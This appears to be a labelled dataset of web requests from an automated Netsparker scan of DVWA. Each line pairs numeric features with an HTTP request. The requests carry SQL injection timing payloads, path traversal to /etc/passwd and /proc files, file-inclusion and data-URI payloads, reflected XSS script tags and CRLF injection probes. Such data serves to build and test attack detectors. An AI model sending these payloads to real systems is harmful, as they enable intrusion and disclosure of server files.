128,1,200,1730,23,56,19,8,1,GET /DVWA/vulnerabilities/sqli/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000190)%3C/scRipt%3E HTTP/1.1
101,1,200,1433,33,23,19,5,1,GET /DVWA/vulnerabilities/fi/?page=%27%2b((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27 HTTP/1.1
111,1,200,1921,11,44,35,5,0,GET /DVWA/vulnerabilities/fi/?page=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fmeminfo HTTP/1.1
90,1,200,1433,14,42,12,5,1,GET /DVWA/vulnerabilities/fi/?page=%5bphp%5dprint(int)0xFFF9999-22%3b%5b%2fphp%5d HTTP/1.1
89,1,200,1433,33,21,15,5,0,GET /DVWA/vulnerabilities/fi/?page=((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)) HTTP/1.1
73,1,200,1433,11,33,13,5,0,GET /DVWA/vulnerabilities/fi/?page=((select%20sleep(25)))a--%201 HTTP/1.1
122,1,200,1433,35,28,24,5,0,GET /DVWA/vulnerabilities/fi/?page=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202)a%20WHERE%201%3dsleep(25)))--%201 HTTP/1.1
203,1,200,1433,33,71,51,5,1,GET /DVWA/vulnerabilities/fi/?page=1%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
204,1,200,1433,33,71,52,5,1,GET /DVWA/vulnerabilities/fi/?page=1)%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
205,1,200,1433,33,71,53,5,1,GET /DVWA/vulnerabilities/fi/?page=1))%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
54,1,200,1433,15,24,3,5,0,GET /DVWA/vulnerabilities/fi/?page=N3tSp4rK3R HTTP/1.1
228,1,200,1433,38,82,54,5,1,GET /DVWA/vulnerabilities/fi/?page=syscolumns%20WHERE%202%3e3%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
57,1,200,1730,13,26,4,8,1,GET /DVWA/vulnerabilities/sqli/?hTTp://r87.com/n HTTP/1.1
128,1,200,1730,23,56,19,8,1,GET /DVWA/vulnerabilities/sqli/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000191)%3C/scRipt%3E HTTP/1.1
114,1,200,2190,11,43,38,5,0,GET /DVWA/vulnerabilities/fi/?page=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
116,1,200,1952,11,45,38,5,0,GET /DVWA/vulnerabilities/fi/?page=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fcpuinfo HTTP/1.1
116,1,200,1920,11,45,38,5,0,GET /DVWA/vulnerabilities/fi/?page=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fmeminfo HTTP/1.1
116,1,200,1544,11,45,38,5,0,GET /DVWA/vulnerabilities/fi/?page=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion HTTP/1.1
118,1,200,1433,11,47,37,5,0,GET /DVWA/vulnerabilities/fi/?page=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion%00.php HTTP/1.1
103,1,200,1433,33,24,19,5,0,GET /DVWA/vulnerabilities/fi/?page=-1%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)) HTTP/1.1
112,1,200,1433,33,25,22,5,1,GET /DVWA/vulnerabilities/fi/?page=-1%22%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%22 HTTP/1.1
112,1,200,1433,33,25,22,5,1,GET /DVWA/vulnerabilities/fi/?page=-1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27 HTTP/1.1
67,1,404,542,12,35,4,5,1,GET /DVWA/vulnerabilities/sqli/%0Ans:netsparker056650=vuln HTTP/1.1
70,1,404,543,13,35,5,5,1,GET /DVWA/vulnerabilities/sqli/%0D%0Ans:netsparker056650=vuln HTTP/1.1
66,1,404,540,12,32,5,5,1,GET /DVWA/vulnerabilities/sqli/%20ns=netsparker(0x00019E) HTTP/1.1
66,1,404,540,12,32,5,5,1,GET /DVWA/vulnerabilities/sqli/%20ns=netsparker(0x00019F) HTTP/1.1
119,1,404,608,23,50,16,8,1,GET /DVWA/vulnerabilities/sqli/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000196)%3C/scRipt%3E HTTP/1.1
119,1,404,608,23,50,16,8,1,GET /DVWA/vulnerabilities/sqli/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000197)%3C/scRipt%3E HTTP/1.1
119,1,404,608,23,50,16,8,1,GET /DVWA/vulnerabilities/sqli/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000198)%3C/scRipt%3E HTTP/1.1
119,1,404,608,23,50,16,8,1,GET /DVWA/vulnerabilities/sqli/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000199)%3C/scRipt%3E HTTP/1.1
120,1,404,608,24,50,17,8,1,GET /DVWA/vulnerabilities/sqli/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001A2)%3C/scRipt%3E HTTP/1.1
120,1,404,608,24,50,17,8,1,GET /DVWA/vulnerabilities/sqli/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001A3)%3C/scRipt%3E HTTP/1.1
69,1,404,552,12,32,6,5,1,GET /DVWA/vulnerabilities/sqli/%22ns=%22netsparker(0x00019A) HTTP/1.1
69,1,404,552,12,32,6,5,1,GET /DVWA/vulnerabilities/sqli/%22ns=%22netsparker(0x00019B) HTTP/1.1
85,1,404,551,13,32,6,5,1,GET /DVWA/vulnerabilities/sqli/%2522ns%253D%2522netsparker%25280x0001A0%2529 HTTP/1.1
85,1,404,551,13,32,6,5,1,GET /DVWA/vulnerabilities/sqli/%2522ns%253D%2522netsparker%25280x0001A1%2529 HTTP/1.1
102,1,200,1730,15,50,17,8,1,GET /DVWA/vulnerabilities/sqli/?'\"@--></style></scRipt><scRipt>netsparker(0x0001A6)</scRipt> HTTP/1.1
102,1,200,1730,15,50,17,8,1,GET /DVWA/vulnerabilities/sqli/?'\"@--></style></scRipt><scRipt>netsparker(0x0001A7)</scRipt> HTTP/1.1
101,1,200,1729,15,50,16,8,1,GET /DVWA/vulnerabilities/sqli/?'\"--></style></scRipt><scRipt>netsparker(0x0001A4)</scRipt> HTTP/1.1
101,1,200,1694,15,50,16,8,1,GET /DVWA/vulnerabilities/sqli/?'\"--></style></scRipt><scRipt>netsparker(0x0001A5)</scRipt> HTTP/1.1
57,1,200,1730,11,27,5,8,1,GET /DVWA/vulnerabilities/sqli/?http://r87.com/? HTTP/1.1
79,1,200,1730,11,44,6,5,1,GET /DVWA/vulnerabilities/sqli/?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
82,1,200,1730,11,45,7,5,1,GET /DVWA/vulnerabilities/sqli/?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
65,1,404,541,12,32,6,5,1,GET /DVWA/vulnerabilities/sqli/'ns='netsparker(0x00019C) HTTP/1.1
65,1,404,541,12,32,6,5,1,GET /DVWA/vulnerabilities/sqli/'ns='netsparker(0x00019D) HTTP/1.1
133,1,200,1739,24,61,18,8,1,GET /DVWA/vulnerabilities/sqli_blind/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001A8)%3C/scRipt%3E HTTP/1.1
44,1,200,1730,15,19,1,5,1,OPTIONS /DVWA/vulnerabilities/sqli/ HTTP/1.1
45,1,200,1730,16,19,1,5,1,PROPFIND /DVWA/vulnerabilities/sqli/ HTTP/1.1
140,1,200,1433,24,30,38,5,0,GET /DVWA/vulnerabilities/fi/?page=%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1
117,1,200,1433,11,43,39,5,0,GET /DVWA/vulnerabilities/fi/?page=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00 HTTP/1.1
121,1,200,1433,11,46,40,5,0,GET /DVWA/vulnerabilities/fi/?page=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.php HTTP/1.1
59,1,200,2190,11,32,5,5,0,GET /DVWA/vulnerabilities/fi/?page=%2fetc%2fpasswd HTTP/1.1
61,1,200,1952,11,34,5,5,0,GET /DVWA/vulnerabilities/fi/?page=%2fproc%2fcpuinfo HTTP/1.1
61,1,200,1920,11,34,5,5,0,GET /DVWA/vulnerabilities/fi/?page=%2fproc%2fmeminfo HTTP/1.1
61,1,200,1544,11,34,5,5,0,GET /DVWA/vulnerabilities/fi/?page=%2fproc%2fversion HTTP/1.1
166,1,200,1433,11,53,70,5,0,GET /DVWA/vulnerabilities/fi/?page=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd HTTP/1.1
83,1,200,1449,23,36,6,5,1,GET /DVWA/vulnerabilities/fi/?page=data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1 HTTP/1.1
113,1,200,1462,36,49,7,5,1,GET /DVWA/vulnerabilities/fi/?page=data%3A%3Bbase64%2CTlNYPD9wcmludChpbnQpMHhGRkY4ODg4IC0gMjY5Mz8%2bTlNY HTTP/1.1
95,1,200,1452,33,34,8,5,1,GET /DVWA/vulnerabilities/fi/?page=data%3A%3Bbase64%2CTlNYQ09ORjUzMDU5OTY2TlNYQ09ORg== HTTP/1.1
72,1,200,2190,11,39,8,5,0,GET /DVWA/vulnerabilities/fi/?page=file%3a%2f%2f%2fetc%2fpasswd HTTP/1.1
74,1,200,1952,11,41,8,5,0,GET /DVWA/vulnerabilities/fi/?page=file%3a%2f%2f%2fproc%2fcpuinfo HTTP/1.1
74,1,200,1916,11,41,8,5,0,GET /DVWA/vulnerabilities/fi/?page=file%3a%2f%2f%2fproc%2fmeminfo HTTP/1.1
74,1,200,1544,11,41,8,5,0,GET /DVWA/vulnerabilities/fi/?page=file%3a%2f%2f%2fproc%2fversion HTTP/1.1
125,1,200,1433,11,53,39,5,0,GET /DVWA/vulnerabilities/fi/?page=include.php%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
130,1,200,1454,34,61,9,9,1,GET /DVWA/vulnerabilities/fi/?page=php://filter/string.rot13/resource=data%3A%3Bbase64%2CTlNYQ09ORjEyNDI1NzUwODBOU1hDT05G HTTP/1.1
130,1,200,1453,32,62,9,9,1,GET /DVWA/vulnerabilities/fi/?page=php://filter/string.rot13/resource=data%3A%3Bbase64%2CTlNYQ09ORjEyNzY2MTg5NTlOU1hDT05G HTTP/1.1
63,1,200,1739,11,32,5,8,1,GET /DVWA/vulnerabilities/sqli_blind/?http://r87.com/? HTTP/1.1
63,1,200,1739,13,31,4,8,1,GET /DVWA/vulnerabilities/sqli_blind/?hTTp://r87.com/n HTTP/1.1
88,1,200,1739,11,50,7,5,1,GET /DVWA/vulnerabilities/sqli_blind/?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
133,1,200,1739,24,61,18,8,1,GET /DVWA/vulnerabilities/sqli_blind/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001A9)%3C/scRipt%3E HTTP/1.1
50,1,200,1739,15,24,1,5,1,OPTIONS /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1
51,1,200,1739,16,24,1,5,1,PROPFIND /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1
125,1,200,1456,38,56,9,5,1,GET /DVWA/vulnerabilities/fi/?page=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwMThEKTwvc2NyaXB0Pg%3d%3d HTTP/1.1
73,1,404,548,12,40,4,5,1,GET /DVWA/vulnerabilities/sqli_blind/%0Ans:netsparker056650=vuln HTTP/1.1
76,1,404,549,13,40,5,5,1,GET /DVWA/vulnerabilities/sqli_blind/%0D%0Ans:netsparker056650=vuln HTTP/1.1
125,1,404,614,24,55,16,8,1,GET /DVWA/vulnerabilities/sqli_blind/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001B0)%3C/scRipt%3E HTTP/1.1
125,1,404,614,24,55,16,8,1,GET /DVWA/vulnerabilities/sqli_blind/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001B1)%3C/scRipt%3E HTTP/1.1
125,1,404,614,24,55,16,8,1,GET /DVWA/vulnerabilities/sqli_blind/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001B2)%3C/scRipt%3E HTTP/1.1
125,1,404,614,24,55,16,8,1,GET /DVWA/vulnerabilities/sqli_blind/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001B3)%3C/scRipt%3E HTTP/1.1
75,1,404,558,12,37,6,5,1,GET /DVWA/vulnerabilities/sqli_blind/%22ns=%22netsparker(0x0001B6) HTTP/1.1
85,1,200,1739,11,49,6,5,1,GET /DVWA/vulnerabilities/sqli_blind/?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
134,1,200,1739,25,61,19,8,1,GET /DVWA/vulnerabilities/sqli_blind/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001AA)%3C/scRipt%3E HTTP/1.1
134,1,200,1739,25,61,19,8,1,GET /DVWA/vulnerabilities/sqli_blind/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001AB)%3C/scRipt%3E HTTP/1.1
129,1,200,1766,24,58,18,8,1,GET /DVWA/vulnerabilities/upload/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001B4)%3C/scRipt%3E HTTP/1.1
72,1,404,546,13,37,5,5,1,GET /DVWA/vulnerabilities/sqli_blind/%20ns=netsparker(0x0001BC) HTTP/1.1
72,1,404,546,13,37,5,5,1,GET /DVWA/vulnerabilities/sqli_blind/%20ns=netsparker(0x0001BD) HTTP/1.1
126,1,404,579,24,55,17,8,1,GET /DVWA/vulnerabilities/sqli_blind/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001C0)%3C/scRipt%3E HTTP/1.1
126,1,404,615,24,55,17,8,1,GET /DVWA/vulnerabilities/sqli_blind/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001C1)%3C/scRipt%3E HTTP/1.1
75,1,404,558,12,37,6,5,1,GET /DVWA/vulnerabilities/sqli_blind/%22ns=%22netsparker(0x0001B7) HTTP/1.1
91,1,404,557,14,37,6,5,1,GET /DVWA/vulnerabilities/sqli_blind/%2522ns%253D%2522netsparker%25280x0001BE%2529 HTTP/1.1
91,1,404,557,14,37,6,5,1,GET /DVWA/vulnerabilities/sqli_blind/%2522ns%253D%2522netsparker%25280x0001BF%2529 HTTP/1.1
107,1,200,1739,15,55,16,8,1,GET /DVWA/vulnerabilities/sqli_blind/?'\"--></style></scRipt><scRipt>netsparker(0x0001C2)</scRipt> HTTP/1.1
107,1,200,1739,15,55,16,8,1,GET /DVWA/vulnerabilities/sqli_blind/?'\"--></style></scRipt><scRipt>netsparker(0x0001C3)</scRipt> HTTP/1.1
71,1,404,547,13,37,6,5,1,GET /DVWA/vulnerabilities/sqli_blind/'ns='netsparker(0x0001BA) HTTP/1.1
71,1,404,547,13,37,6,5,1,GET /DVWA/vulnerabilities/sqli_blind/'ns='netsparker(0x0001BB) HTTP/1.1
59,1,200,1766,13,28,4,8,0,GET /DVWA/vulnerabilities/upload/?hTTp://r87.com/n HTTP/1.1
129,1,200,1765,24,58,18,8,1,GET /DVWA/vulnerabilities/upload/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001B5)%3C/scRipt%3E HTTP/1.1
130,1,200,1765,24,58,19,8,1,GET /DVWA/vulnerabilities/upload/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001B8)%3C/scRipt%3E HTTP/1.1
130,1,200,1765,24,58,19,8,1,GET /DVWA/vulnerabilities/upload/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001B9)%3C/scRipt%3E HTTP/1.1
108,1,200,1739,15,55,17,8,1,GET /DVWA/vulnerabilities/sqli_blind/?'\"@--></style></scRipt><scRipt>netsparker(0x0001C4)</scRipt> HTTP/1.1
108,1,200,1739,15,55,17,8,1,GET /DVWA/vulnerabilities/sqli_blind/?'\"@--></style></scRipt><scRipt>netsparker(0x0001C5)</scRipt> HTTP/1.1
68,1,404,543,12,34,5,5,1,GET /DVWA/vulnerabilities/upload/%20ns=netsparker(0x0001D2) HTTP/1.1
68,1,404,543,12,34,5,5,1,GET /DVWA/vulnerabilities/upload/%20ns=netsparker(0x0001D3) HTTP/1.1
121,1,404,610,25,52,16,8,1,GET /DVWA/vulnerabilities/upload/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001CA)%3C/scRipt%3E HTTP/1.1
121,1,404,610,25,52,16,8,1,GET /DVWA/vulnerabilities/upload/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001CB)%3C/scRipt%3E HTTP/1.1
121,1,404,610,25,52,16,8,1,GET /DVWA/vulnerabilities/upload/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001CC)%3C/scRipt%3E HTTP/1.1
121,1,404,610,25,52,16,8,1,GET /DVWA/vulnerabilities/upload/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001CD)%3C/scRipt%3E HTTP/1.1
122,1,404,611,24,52,17,8,1,GET /DVWA/vulnerabilities/upload/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001D6)%3C/scRipt%3E HTTP/1.1
122,1,404,611,24,52,17,8,1,GET /DVWA/vulnerabilities/upload/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001D7)%3C/scRipt%3E HTTP/1.1
71,1,404,554,13,34,6,5,1,GET /DVWA/vulnerabilities/upload/%22ns=%22netsparker(0x0001CE) HTTP/1.1
71,1,404,554,13,34,6,5,1,GET /DVWA/vulnerabilities/upload/%22ns=%22netsparker(0x0001CF) HTTP/1.1
87,1,404,554,13,34,6,5,1,GET /DVWA/vulnerabilities/upload/%2522ns%253D%2522netsparker%25280x0001D4%2529 HTTP/1.1
87,1,404,554,13,34,6,5,1,GET /DVWA/vulnerabilities/upload/%2522ns%253D%2522netsparker%25280x0001D5%2529 HTTP/1.1
103,1,200,1766,15,52,16,8,1,GET /DVWA/vulnerabilities/upload/?'\"--></style></scRipt><scRipt>netsparker(0x0001D8)</scRipt> HTTP/1.1
103,1,200,1766,15,52,16,8,1,GET /DVWA/vulnerabilities/upload/?'\"--></style></scRipt><scRipt>netsparker(0x0001D9)</scRipt> HTTP/1.1
59,1,200,1766,11,29,5,8,0,GET /DVWA/vulnerabilities/upload/?http://r87.com/? HTTP/1.1
81,1,200,1766,11,46,6,5,0,GET /DVWA/vulnerabilities/upload/?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
84,1,200,1766,11,47,7,5,0,GET /DVWA/vulnerabilities/upload/?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
67,1,404,544,12,34,6,5,1,GET /DVWA/vulnerabilities/upload/'ns='netsparker(0x0001D0) HTTP/1.1
67,1,404,544,12,34,6,5,1,GET /DVWA/vulnerabilities/upload/'ns='netsparker(0x0001D1) HTTP/1.1
46,1,200,1767,15,21,1,5,0,OPTIONS /DVWA/vulnerabilities/upload/ HTTP/1.1
47,1,200,1766,16,21,1,5,0,PROPFIND /DVWA/vulnerabilities/upload/ HTTP/1.1
142,2,200,1637,24,68,21,8,1,GET /DVWA/vulnerabilities/fi/?page=include.php&nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001E4)%3C/scRipt%3E HTTP/1.1
142,2,200,1637,24,68,21,8,1,GET /DVWA/vulnerabilities/fi/?page=include.php&nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001E5)%3C/scRipt%3E HTTP/1.1
143,2,200,1637,24,68,22,8,1,GET /DVWA/vulnerabilities/fi/?page=include.php&nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001E6)%3C/scRipt%3E HTTP/1.1
69,1,404,544,12,37,4,5,1,GET /DVWA/vulnerabilities/upload/%0Ans:netsparker056650=vuln HTTP/1.1
72,1,404,545,13,37,5,5,1,GET /DVWA/vulnerabilities/upload/%0D%0Ans:netsparker056650=vuln HTTP/1.1
104,1,200,1766,16,52,17,8,1,GET /DVWA/vulnerabilities/upload/?'\"@--></style></scRipt><scRipt>netsparker(0x0001DA)</scRipt> HTTP/1.1
104,1,200,1766,16,52,17,8,1,GET /DVWA/vulnerabilities/upload/?'\"@--></style></scRipt><scRipt>netsparker(0x0001DB)</scRipt> HTTP/1.1
128,1,200,1690,25,56,18,8,1,GET /DVWA/vulnerabilities/xss_r/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001DC)%3C/scRipt%3E HTTP/1.1
128,1,200,1690,25,56,18,8,1,GET /DVWA/vulnerabilities/xss_r/?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001DD)%3C/scRipt%3E HTTP/1.1
129,1,200,1690,25,56,19,8,1,GET /DVWA/vulnerabilities/xss_r/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001DE)%3C/scRipt%3E HTTP/1.1
129,1,200,1690,25,56,19,8,1,GET /DVWA/vulnerabilities/xss_r/?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001DF)%3C/scRipt%3E HTTP/1.1
143,2,200,1637,24,68,22,8,1,GET /DVWA/vulnerabilities/fi/?page=include.php&nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001E7)%3C/scRipt%3E HTTP/1.1
58,1,200,1690,11,27,5,8,1,GET /DVWA/vulnerabilities/xss_r/?http://r87.com/? HTTP/1.1
58,1,200,1690,13,26,4,8,1,GET /DVWA/vulnerabilities/xss_r/?hTTp://r87.com/n HTTP/1.1
80,1,200,1690,11,44,6,5,1,GET /DVWA/vulnerabilities/xss_r/?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
83,1,200,1690,11,45,7,5,1,GET /DVWA/vulnerabilities/xss_r/?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
48,1,200,1802,11,19,6,6,0,GET /DVWA/security.php?http://r87.com/? HTTP/1.1
70,1,200,1802,11,36,7,3,0,GET /DVWA/security.php?nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
73,1,200,1802,11,37,8,3,0,GET /DVWA/security.php?nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
118,1,200,1802,24,48,19,6,1,GET /DVWA/security.php?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001F6)%3C/scRipt%3E HTTP/1.1
118,1,200,1801,24,48,19,6,1,GET /DVWA/security.php?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001F7)%3C/scRipt%3E HTTP/1.1
119,1,200,1766,23,48,20,6,1,GET /DVWA/security.php?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000200)%3C/scRipt%3E HTTP/1.1
68,1,404,543,12,35,4,5,1,GET /DVWA/vulnerabilities/xss_r/%0Ans:netsparker056650=vuln HTTP/1.1
71,1,404,544,13,35,5,5,1,GET /DVWA/vulnerabilities/xss_r/%0D%0Ans:netsparker056650=vuln HTTP/1.1
67,1,404,541,12,32,5,5,1,GET /DVWA/vulnerabilities/xss_r/%20ns=netsparker(0x0001F4) HTTP/1.1
67,1,404,541,12,32,5,5,1,GET /DVWA/vulnerabilities/xss_r/%20ns=netsparker(0x0001F5) HTTP/1.1
120,1,404,609,25,50,16,8,1,GET /DVWA/vulnerabilities/xss_r/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001EC)%3C/scRipt%3E HTTP/1.1
120,1,404,609,25,50,16,8,1,GET /DVWA/vulnerabilities/xss_r/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001ED)%3C/scRipt%3E HTTP/1.1
120,1,404,609,25,50,16,8,1,GET /DVWA/vulnerabilities/xss_r/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001EE)%3C/scRipt%3E HTTP/1.1
120,1,404,609,25,50,16,8,1,GET /DVWA/vulnerabilities/xss_r/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001EF)%3C/scRipt%3E HTTP/1.1
121,1,404,610,25,50,17,8,1,GET /DVWA/vulnerabilities/xss_r/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001FA)%3C/scRipt%3E HTTP/1.1
121,1,404,609,25,50,17,8,1,GET /DVWA/vulnerabilities/xss_r/'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0001FB)%3C/scRipt%3E HTTP/1.1
70,1,404,553,12,32,6,5,1,GET /DVWA/vulnerabilities/xss_r/%22ns=%22netsparker(0x0001F0) HTTP/1.1
70,1,404,553,12,32,6,5,1,GET /DVWA/vulnerabilities/xss_r/%22ns=%22netsparker(0x0001F1) HTTP/1.1
86,1,404,552,13,32,6,5,1,GET /DVWA/vulnerabilities/xss_r/%2522ns%253D%2522netsparker%25280x0001F8%2529 HTTP/1.1
86,1,404,553,13,32,6,5,1,GET /DVWA/vulnerabilities/xss_r/%2522ns%253D%2522netsparker%25280x0001F9%2529 HTTP/1.1
